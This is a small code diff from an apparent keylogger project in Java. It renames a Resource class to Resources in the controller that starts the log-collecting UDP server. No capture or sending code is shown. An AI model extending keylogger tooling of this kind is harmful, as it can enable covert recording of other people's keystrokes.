@@ -4,7 +4,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 
 import com.hao.keylogger.models.Log;
-import com.hao.keylogger.models.Resource;
+import com.hao.keylogger.models.Resources;
 import com.hao.keylogger.views.ServerView;
 
 public class ServerLogController {
@@ -20,7 +20,7 @@ public class ServerLogController {
 		this.log = log;
 		view.setController(this);
 		view.setHost(UDPServerHelper.getLocalHostIP());
-		view.setPort(Resource.DEFAULT_PORT);
+		view.setPort(Resources.DEFAULT_PORT);
 		toggleServerOnOrOff();
 	}
 
